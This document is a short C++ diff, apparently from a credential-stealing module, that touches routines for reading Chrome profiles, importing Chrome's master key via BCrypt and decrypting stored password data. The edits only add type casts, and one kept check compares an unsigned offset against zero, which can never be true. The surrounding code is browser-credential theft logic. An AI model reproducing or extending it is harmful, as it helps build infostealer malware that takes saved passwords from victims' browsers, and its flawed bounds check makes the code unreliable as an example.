@@ -115,8 +115,8 @@ std::string mod_Info::m_DecryptData(const std::string& strPass) {
 	m_memcpy(IV.data(), strPass.data() + 3, 12);
 	m_memcpy(vc_CipherPass.data(), strPass.data() + 15, encSize - 15);
 
-	size_t tagOffset = encSize - 31;
-	if (tagOffset < 0 || tagOffset > vc_CipherPass.size()) {
+	ULONG tagOffset = static_cast<ULONG>(encSize - 31);
+	if (tagOffset < 0 || tagOffset > static_cast<ULONG>(vc_CipherPass.size())) {
 		__DBG_("Error parseando el offset");
 		return strOut;
 	}
@@ -291,7 +291,7 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 				m_memcpy(this->vcChromeKey.data(), strMasterKey.data(), strMasterKey.size());
 
 				DATA_BLOB MasterKey;
-				MasterKey.cbData = this->vcChromeKey.size();
+				MasterKey.cbData = static_cast<DWORD>(this->vcChromeKey.size());
 				MasterKey.pbData = this->vcChromeKey.data();
 				NTSTATUS nStatus = this->BCRYPT.pBCryptGenerateSymmetricKey(this->hAlgorithm, &this->hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
 				if (!BCRYPT_SUCCESS(nStatus)) {
